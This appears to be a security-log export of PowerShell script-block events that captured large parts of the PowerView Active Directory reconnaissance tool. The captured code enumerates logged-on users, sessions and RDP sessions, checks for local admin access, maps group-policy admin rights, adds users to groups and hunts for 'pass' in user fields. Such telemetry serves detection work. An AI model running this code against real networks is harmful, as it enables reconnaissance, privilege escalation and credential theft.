[CmdletBinding()]    Param (        [String]        $GPOname = '*',        [String]        $DisplayName,        [Switch]        $ResolveSids,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $UsePSDrive,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    # get every GPO from the specified domain with restricted groups set    Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {        $Memberof = $Null        $Members = $Null        $GPOdisplayName = $_.displayname        $GPOname = $_.name        $GPOPath = $_.gpcfilesyspath        $ParseArgs =  @{            'GptTmplPath' = ""$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""            'UsePSDrive' = $UsePSDrive        }        # parse the GptTmpl.inf 'Restricted Groups' file if it exists        $Inf = Get-GptTmpl @ParseArgs        if($Inf.GroupMembership) {            $Memberof = $Inf.GroupMembership | Get-Member *Memberof | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }            $Members = $Inf.GroupMembership | Get-Member *Members | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }            # only return an object if Members are found            if ($Members -or $Memberof) {                # if there is no Memberof defined, assume local admins                if(!$Memberof) {                    $Memberof = 'S-1-5-32-544'                }                if($ResolveSids) {                    $Memberof = $Memberof | ForEach-Object {Convert-SidToName $_}                    $Members = $Members | ForEach-Object {Convert-SidToName $_}                }                if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}                if($Members -isnot [system.array]) {$Members = @($Members)}                $GPOProperties = @{                    'GPODisplayName' = $GPODisplayName                    'GPOName' = $GPOName                    'GPOPath' = $GPOPath                    'Filters' = $Null                    'MemberOf' = $Memberof                    'Members' = $Members                }                New-Object -TypeName PSObject -Property $GPOProperties            }        }        $ParseArgs =  @{            'GroupsXMLpath' = ""$GPOPath\MACHINE\Preferences\Groups\Groups.xml""            'ResolveSids' = $ResolveSids            'UsePSDrive' = $UsePSDrive        }        Get-GroupsXML @ParseArgs    }}function Find-GPOLocation {<#    .SYNOPSIS        Takes a user/group name and optional domain, and determines         the computers in the domain the user/group has local admin         (or RDP) rights to.        It does this by:            1.  resolving the user/group to its proper sid            2.  enumerating all groups the user/group is a current part of                 and extracting all target SIDs to build a target SID list            3.  pulling all GPOs that set 'Restricted Groups' by calling                Get-NetGPOGroup            4.  matching the target sid list to the queried GPO SID list                to enumerate all GPO the user is effectively applied with            5.  enumerating all OUs and sites and applicable GPO GUIs are                applied to through gplink enumerating            6.  querying for all computers under the given OUs or sites    .PARAMETER UserName        A (single) user name name to query for access.    .PARAMETER GroupName        A (single) group name name to query for access.     .PARAMETER Domain        Optional domain the user exists in for querying, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER LocalGroup        The local group to check access against.        Can be ""Administrators"" (S-1-5-32-544), ""RDP/Remote Desktop Users"" (S-1-5-32-555),        or a custom local SID. Defaults to local 'Administrators'.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-GPOLocation -UserName dfm                Find all computers that dfm user has local administrator rights to in         the current domain.    .EXAMPLE        PS C:\> Find-GPOLocation -UserName dfm -Domain dev.testlab.local                Find all computers that dfm user has local administrator rights to in         the dev.testlab.local domain.    .EXAMPLE        PS C:\> Find-GPOLocation -UserName jason -LocalGroup RDP                Find all computers that jason has local RDP access rights to in the domain.#>    [CmdletBinding()]    Param (        [String]        $UserName,        [String]        $GroupName,        [String]        $Domain,        [String]        $DomainController,        [String]        $LocalGroup = 'Administrators',                [Switch]        $UsePSDrive,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if($UserName) {        $User = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize        $UserSid = $User.objectsid        if(!$UserSid) {                Throw ""User '$UserName' not found!""        }        $TargetSid = $UserSid        $ObjectSamAccountName = $User.samaccountname        $ObjectDistName = $User.distinguishedname    }    elseif($GroupName) {        $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize        $GroupSid = $Group.objectsid        if(!$GroupSid) {                Throw ""Group '$GroupName' not found!""        }        $TargetSid = $GroupSid        $ObjectSamAccountName = $Group.samaccountname        $ObjectDistName = $Group.distinguishedname    }    else {        throw ""-UserName or -GroupName must be specified!""    }    if($LocalGroup -like ""*Admin*"") {        $LocalSID = ""S-1-5-32-544""    }    elseif ( ($LocalGroup -like ""*RDP*"") -or ($LocalGroup -like ""*Remote*"") ) {        $LocalSID = ""S-1-5-32-555""    }    elseif ($LocalGroup -like ""S-1-5*"") {        $LocalSID = $LocalGroup    }    else {        throw ""LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' type sid.""    }    Write-Verbose ""LocalSid: $LocalSID""    Write-Verbose ""TargetSid: $TargetSid""    Write-Verbose ""TargetObjectDistName: $ObjectDistName""    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }    # use the tokenGroups approach from Get-NetGroup to get all effective    #   security SIDs this object is a part of    $TargetSid += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $ObjectSamAccountName -RawSids    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }    Write-Verbose ""Effective target sids: $TargetSid""    $GPOGroupArgs =  @{        'Domain' = $Domain        'DomainController' = $DomainController        'UsePSDrive' = $UsePSDrive        'PageSize' = $PageSize    }    # get all GPO groups, and filter on ones that match our target SID list    #   and match the target local sid memberof list    $GPOgroups = Get-NetGPOGroup @GPOGroupArgs | ForEach-Object {                if ($_.members) {            $_.members = $_.members | Where-Object {$_} | ForEach-Object {                if($_ -match ""S-1-5"") {                    $_                }                else {                    # if there are any plain group names, try to resolve them to sids                    Convert-NameToSid -ObjectName $_ -Domain $Domain                }            }            # stop PowerShell 2.0's string stupid unboxing            if($_.members -isnot [system.array]) { $_.members = @($_.members) }            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }                        if($_.members) {                try {                    # only return groups that contain a target sid                    # TODO: fix stupid weird ""-DifferenceObject"" is null error                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $TargetSid -IncludeEqual -ExcludeDifferent) ) {                        if ($_.memberof -contains $LocalSid) {                            $_                        }                    }                }                 catch {                    Write-Debug ""Error comparing members and $TargetSid : $_""                }            }        }    }    Write-Verbose ""GPOgroups: $GPOgroups""    $ProcessedGUIDs = @{}    # process the matches and build the result objects    $GPOgroups | Where-Obje","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"BnV3ypsB8mE-0EyZtX_T","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (15 of 26): to query for logged on users.    .OUTPUTS        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1        result structure which includes the username and domain of logged on users.    .EXAMPLE        PS C:\> Get-NetLoggedon        Returns users actively logged onto the local host.    .EXAMPLE        PS C:\> Get-NetLoggedon -ComputerName sqlserver        Returns users actively logged onto the 'sqlserver' host.    .LINK        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost'    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # Declare the reference variables        $QueryLevel = 1        $PtrInfo = [IntPtr]::Zero        $EntriesRead = 0        $TotalRead = 0        $ResumeHandle = 0        # get logged on user information        $Result = $Netapi32::NetWkstaUserEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)        # Locate the offset of the initial intPtr        $Offset = $PtrInfo.ToInt64()        Write-Debug ""Get-NetLoggedon result: $Result""        # 0 = success        if (($Result -eq 0) -and ($Offset -gt 0)) {            # Work out how mutch to increment the pointer by finding out the size of the structure            $Increment = $WKSTA_USER_INFO_1::GetSize()            # parse all the result structures            for ($i = 0; ($i -lt $EntriesRead); $i++) {                # create a new int ptr at the given offset and cast                #   the pointer as our result structure                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                $Info = $NewIntPtr -as $WKSTA_USER_INFO_1                # return all the sections of the structure                $Info | Select-Object *                $Offset = $NewIntPtr.ToInt64()                $Offset += $Increment            }            # free up the result buffer            $Null = $Netapi32::NetApiBufferFree($PtrInfo)        }        else        {            switch ($Result) {                (5)           {Write-Debug 'The user does not have access to the requested information.'}                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}                (87)          {Write-Debug 'The specified parameter is not valid.'}                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}                (8)           {Write-Debug 'Insufficient memory is available.'}                (2312)        {Write-Debug 'A session does not exist with the computer name.'}                (2351)        {Write-Debug 'The computer name is not valid.'}                (2221)        {Write-Debug 'Username not found.'}                (53)          {Write-Debug 'Hostname could not be found'}            }        }    }}function Get-NetSession {<#    .SYNOPSIS        This function will execute the NetSessionEnum Win32API call to query        a given host for active sessions on the host.        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)    .PARAMETER ComputerName        The ComputerName to query for active sessions.    .PARAMETER UserName        The user name to filter for active sessions.    .OUTPUTS        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10        result structure which includes the host and username associated        with active sessions.    .EXAMPLE        PS C:\> Get-NetSession        Returns active sessions on the local host.    .EXAMPLE        PS C:\> Get-NetSession -ComputerName sqlserver        Returns active sessions on the 'sqlserver' host.    .LINK        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost',        [String]        $UserName = ''    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # arguments for NetSessionEnum        $QueryLevel = 10        $PtrInfo = [IntPtr]::Zero        $EntriesRead = 0        $TotalRead = 0        $ResumeHandle = 0        # get session information        $Result = $Netapi32::NetSessionEnum($ComputerName, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)        # Locate the offset of the initial intPtr        $Offset = $PtrInfo.ToInt64()        Write-Debug ""Get-NetSession result: $Result""        # 0 = success        if (($Result -eq 0) -and ($Offset -gt 0)) {            # Work out how mutch to increment the pointer by finding out the size of the structure            $Increment = $SESSION_INFO_10::GetSize()            # parse all the result structures            for ($i = 0; ($i -lt $EntriesRead); $i++) {                # create a new int ptr at the given offset and cast                # the pointer as our result structure                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                $Info = $NewIntPtr -as $SESSION_INFO_10                # return all the sections of the structure                $Info | Select-Object *                $Offset = $NewIntPtr.ToInt64()                $Offset += $Increment            }            # free up the result buffer            $Null = $Netapi32::NetApiBufferFree($PtrInfo)        }        else        {            switch ($Result) {                (5)           {Write-Debug 'The user does not have access to the requested information.'}                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}                (87)          {Write-Debug 'The specified parameter is not valid.'}                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}                (8)           {Write-Debug 'Insufficient memory is available.'}                (2312)        {Write-Debug 'A session does not exist with the computer name.'}                (2351)        {Write-Debug 'The computer name is not valid.'}                (2221)        {Write-Debug 'Username not found.'}                (53)          {Write-Debug 'Hostname could not be found'}            }        }    }}function Get-NetRDPSession {<#    .SYNOPSIS        This function will execute the WTSEnumerateSessionsEx and         WTSQuerySessionInformation Win32API calls to query a given        RDP remote service for active sessions and originating IPs.        This is a replacement for qwinsta.        Note: only members of the Administrators or Account Operators local group        can successfully execute this functionality on a remote target.    .PARAMETER ComputerName        The hostname to query for active RDP sessions.    .EXAMPLE        PS C:\> Get-NetRDPSession        Returns active RDP/terminal sessions on the local host.    .EXAMPLE        PS C:\> Get-NetRDPSession -ComputerName ""sqlserver""        Returns active RDP/terminal sessions on the 'sqlserver' host.#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost'    )        begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # open up a handle to the Remote Desktop Session host        $Handle = $Wtsapi32::WTSOpenServerEx($ComputerName)        # if we get a non-zero handle back, everything was successful        if ($Handle -ne 0) {            Write-Debug ""WTSOpenServerEx handle: $Handle""            # arguments for WTSEnumerateSessionsEx            $ppSessionInfo = [IntPtr]::Zero            $pCount = 0                        # get information on all current sessions            $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)            # Locate the offset of the initial intPtr            $Offset = $ppSessionInfo.ToInt64()            Write-Debug ""WTSEnumerateSessionsEx result: $Result""            Write-Debug ""pCount: $pCount""            if (($Result -ne 0) -and ($Offset -gt 0)) {                # Work out how mutch to increment the pointer by finding out the size of the structure                $Increment = $WTS_SESSION_INFO_1::GetSize()                # parse all the result structures                for ($i = 0; ($i -lt $pCount); $i++) {                         # create a new int ptr at the given offset and cast                    #   the pointer as our result structure                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                    $Info = $NewIntPtr -as $WTS_SESSION_INFO_1                    $RDPSession = New-Object PSObject                    if ($Info.pHostName) {                        $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName                    }                    else {                        # if no hostname returned, use the specified hostname                        $RDPSession | Add-Member Noteproperty 'ComputerName' $ComputerName                    }                    $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {                        # if a domain isn't returned just use the username                        $RDPSession | Add-Member Noteproperty 'UserName' ""$($Info.pUserName)""                    }                    else {                        $RDPSession | Add-Member Noteproperty 'UserName' ""$($Info.pDomainName)\$($Info.pUserName)""                    }                    $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID                    $RDPSession | Add-Member Noteproperty 'State' $Info.State                    $ppBuffer = [IntPtr]::Zero                    $pBytesReturned = 0                    # query for the source client IP with WTSQuerySessionInformation                    #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned)                    $Offset2 = $ppBuffer.ToInt64()                    $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2                    $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS                    $SourceIP = $Info2.Address                           if($SourceIP[2] -ne 0) {                        $SourceIP = [String]$SourceIP[2]+"".""+[String]$SourceIP[3]+"".""+[String]$SourceIP[4]+"".""+[String]$SourceIP[5]                    }                    else {                        $SourceIP = $Null                    }                    $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP                    $RDPSession                    # free up the memory buffer                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)                    $Offset += $Increment                }                # free up the memory result buffer                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)            }            # Close off the service handle            $Null = $Wtsapi32::WTSCloseServer($Handle)        }        else {            # otherwise it failed - get the last error            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx            $Err = $Kernel32::GetLastError()            Write-Verbuse ""LastError: $Err""        }    }}function Invoke-CheckLocalAdminAccess {<#    .SYNOPSIS        This function will use the OpenSCManagerW Win32API call to to establish        a handle to the remote host. If this succeeds, the current user context        has local administrator acess to the target.        Idea stolen from the local_admin_search_enum post module in Metasploit written by:            'Brandon McCann ""zeknox"" <bmccann[at]accuvant.com>'            'Thomas McCarthy ""smilingraccoon"" <smilingraccoon[at]gmail.com>'            'Royce Davis ""r3dy"" <rdavis[at]accuvant.com>'    .PARAMETER ComputerName        The hostname to query for active sessions.    .OUTPUTS        $True if the current user has local admin access to the hostname, $False otherwise    .EXAMPLE        PS C:\> Invoke-CheckLocalAdminAccess -ComputerName sqlserver        Returns active sessions on the local host.    .LINK        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        [Alias('HostName')]        $ComputerName = 'localhost'    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline ScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-"," to query for logged on users.    .OUTPUTS        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1        result structure which includes the username and domain of logged on users.    .EXAMPLE        PS C:\> Get-NetLoggedon        Returns users actively logged onto the local host.    .EXAMPLE        PS C:\> Get-NetLoggedon -ComputerName sqlserver        Returns users actively logged onto the 'sqlserver' host.    .LINK        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost'    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # Declare the reference variables        $QueryLevel = 1        $PtrInfo = [IntPtr]::Zero        $EntriesRead = 0        $TotalRead = 0        $ResumeHandle = 0        # get logged on user information        $Result = $Netapi32::NetWkstaUserEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)        # Locate the offset of the initial intPtr        $Offset = $PtrInfo.ToInt64()        Write-Debug ""Get-NetLoggedon result: $Result""        # 0 = success        if (($Result -eq 0) -and ($Offset -gt 0)) {            # Work out how mutch to increment the pointer by finding out the size of the structure            $Increment = $WKSTA_USER_INFO_1::GetSize()            # parse all the result structures            for ($i = 0; ($i -lt $EntriesRead); $i++) {                # create a new int ptr at the given offset and cast                #   the pointer as our result structure                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                $Info = $NewIntPtr -as $WKSTA_USER_INFO_1                # return all the sections of the structure                $Info | Select-Object *                $Offset = $NewIntPtr.ToInt64()                $Offset += $Increment            }            # free up the result buffer            $Null = $Netapi32::NetApiBufferFree($PtrInfo)        }        else        {            switch ($Result) {                (5)           {Write-Debug 'The user does not have access to the requested information.'}                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}                (87)          {Write-Debug 'The specified parameter is not valid.'}                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}                (8)           {Write-Debug 'Insufficient memory is available.'}                (2312)        {Write-Debug 'A session does not exist with the computer name.'}                (2351)        {Write-Debug 'The computer name is not valid.'}                (2221)        {Write-Debug 'Username not found.'}                (53)          {Write-Debug 'Hostname could not be found'}            }        }    }}function Get-NetSession {<#    .SYNOPSIS        This function will execute the NetSessionEnum Win32API call to query        a given host for active sessions on the host.        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)    .PARAMETER ComputerName        The ComputerName to query for active sessions.    .PARAMETER UserName        The user name to filter for active sessions.    .OUTPUTS        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10        result structure which includes the host and username associated        with active sessions.    .EXAMPLE        PS C:\> Get-NetSession        Returns active sessions on the local host.    .EXAMPLE        PS C:\> Get-NetSession -ComputerName sqlserver        Returns active sessions on the 'sqlserver' host.    .LINK        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost',        [String]        $UserName = ''    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # arguments for NetSessionEnum        $QueryLevel = 10        $PtrInfo = [IntPtr]::Zero        $EntriesRead = 0        $TotalRead = 0        $ResumeHandle = 0        # get session information        $Result = $Netapi32::NetSessionEnum($ComputerName, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)        # Locate the offset of the initial intPtr        $Offset = $PtrInfo.ToInt64()        Write-Debug ""Get-NetSession result: $Result""        # 0 = success        if (($Result -eq 0) -and ($Offset -gt 0)) {            # Work out how mutch to increment the pointer by finding out the size of the structure            $Increment = $SESSION_INFO_10::GetSize()            # parse all the result structures            for ($i = 0; ($i -lt $EntriesRead); $i++) {                # create a new int ptr at the given offset and cast                # the pointer as our result structure                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                $Info = $NewIntPtr -as $SESSION_INFO_10                # return all the sections of the structure                $Info | Select-Object *                $Offset = $NewIntPtr.ToInt64()                $Offset += $Increment            }            # free up the result buffer            $Null = $Netapi32::NetApiBufferFree($PtrInfo)        }        else        {            switch ($Result) {                (5)           {Write-Debug 'The user does not have access to the requested information.'}                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}                (87)          {Write-Debug 'The specified parameter is not valid.'}                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}                (8)           {Write-Debug 'Insufficient memory is available.'}                (2312)        {Write-Debug 'A session does not exist with the computer name.'}                (2351)        {Write-Debug 'The computer name is not valid.'}                (2221)        {Write-Debug 'Username not found.'}                (53)          {Write-Debug 'Hostname could not be found'}            }        }    }}function Get-NetRDPSession {<#    .SYNOPSIS        This function will execute the WTSEnumerateSessionsEx and         WTSQuerySessionInformation Win32API calls to query a given        RDP remote service for active sessions and originating IPs.        This is a replacement for qwinsta.        Note: only members of the Administrators or Account Operators local group        can successfully execute this functionality on a remote target.    .PARAMETER ComputerName        The hostname to query for active RDP sessions.    .EXAMPLE        PS C:\> Get-NetRDPSession        Returns active RDP/terminal sessions on the local host.    .EXAMPLE        PS C:\> Get-NetRDPSession -ComputerName ""sqlserver""        Returns active RDP/terminal sessions on the 'sqlserver' host.#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost'    )        begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # open up a handle to the Remote Desktop Session host        $Handle = $Wtsapi32::WTSOpenServerEx($ComputerName)        # if we get a non-zero handle back, everything was successful        if ($Handle -ne 0) {            Write-Debug ""WTSOpenServerEx handle: $Handle""            # arguments for WTSEnumerateSessionsEx            $ppSessionInfo = [IntPtr]::Zero            $pCount = 0                        # get information on all current sessions            $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)            # Locate the offset of the initial intPtr            $Offset = $ppSessionInfo.ToInt64()            Write-Debug ""WTSEnumerateSessionsEx result: $Result""            Write-Debug ""pCount: $pCount""            if (($Result -ne 0) -and ($Offset -gt 0)) {                # Work out how mutch to increment the pointer by finding out the size of the structure                $Increment = $WTS_SESSION_INFO_1::GetSize()                # parse all the result structures                for ($i = 0; ($i -lt $pCount); $i++) {                         # create a new int ptr at the given offset and cast                    #   the pointer as our result structure                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                    $Info = $NewIntPtr -as $WTS_SESSION_INFO_1                    $RDPSession = New-Object PSObject                    if ($Info.pHostName) {                        $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName                    }                    else {                        # if no hostname returned, use the specified hostname                        $RDPSession | Add-Member Noteproperty 'ComputerName' $ComputerName                    }                    $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {                        # if a domain isn't returned just use the username                        $RDPSession | Add-Member Noteproperty 'UserName' ""$($Info.pUserName)""                    }                    else {                        $RDPSession | Add-Member Noteproperty 'UserName' ""$($Info.pDomainName)\$($Info.pUserName)""                    }                    $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID                    $RDPSession | Add-Member Noteproperty 'State' $Info.State                    $ppBuffer = [IntPtr]::Zero                    $pBytesReturned = 0                    # query for the source client IP with WTSQuerySessionInformation                    #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned)                    $Offset2 = $ppBuffer.ToInt64()                    $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2                    $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS                    $SourceIP = $Info2.Address                           if($SourceIP[2] -ne 0) {                        $SourceIP = [String]$SourceIP[2]+"".""+[String]$SourceIP[3]+"".""+[String]$SourceIP[4]+"".""+[String]$SourceIP[5]                    }                    else {                        $SourceIP = $Null                    }                    $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP                    $RDPSession                    # free up the memory buffer                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)                    $Offset += $Increment                }                # free up the memory result buffer                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)            }            # Close off the service handle            $Null = $Wtsapi32::WTSCloseServer($Handle)        }        else {            # otherwise it failed - get the last error            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx            $Err = $Kernel32::GetLastError()            Write-Verbuse ""LastError: $Err""        }    }}function Invoke-CheckLocalAdminAccess {<#    .SYNOPSIS        This function will use the OpenSCManagerW Win32API call to to establish        a handle to the remote host. If this succeeds, the current user context        has local administrator acess to the target.        Idea stolen from the local_admin_search_enum post module in Metasploit written by:            'Brandon McCann ""zeknox"" <bmccann[at]accuvant.com>'            'Thomas McCarthy ""smilingraccoon"" <smilingraccoon[at]gmail.com>'            'Royce Davis ""r3dy"" <rdavis[at]accuvant.com>'    .PARAMETER ComputerName        The hostname to query for active sessions.    .OUTPUTS        $True if the current user has local admin access to the hostname, $False otherwise    .EXAMPLE        PS C:\> Invoke-CheckLocalAdminAccess -ComputerName sqlserver        Returns active sessions on the local host.    .LINK        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        [Alias('HostName')]        $ComputerName = 'localhost'    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline ","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"AnV3ypsB8mE-0EyZln-D","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (6 of 26):    }            else {                # otherwise, get the local machine context                Write-Verbose ""Adding user $UserName to $GroupName on localhost""                $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)            }            # find the particular group            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)            # add the particular user to the group            $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)            # commit the changes            $Group.Save()        }        catch {            Write-Warning ""Error adding $UserName to $GroupName : $_""        }    }}function Get-UserProperty {<#    .SYNOPSIS        Returns a list of all user object properties. If a property        name is specified, it returns all [user:property] values.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER Properties        Property names to extract for users.    .PARAMETER Domain        The domain to query for user properties, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-UserProperty -Domain testing                Returns all user properties for users in the 'testing' domain.    .EXAMPLE        PS C:\> Get-UserProperty -Properties ssn,lastlogon,location                Returns all an array of user/ssn/lastlogin/location combinations        for users in the current domain.    .LINK        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html#>    [CmdletBinding()]    param(        [String[]]        $Properties,        [String]        $Domain,                [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if($Properties) {        # extract out the set of all properties for each object        $Properties = ,""name"" + $Properties        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -Property $Properties    }    else {        # extract out just the property names        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'    }}function Find-UserField {<#    .SYNOPSIS        Searches user object fields for a given word (default *pass*). Default        field being searched is 'description'.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER SearchTerm        Term to search for, default of ""pass"".    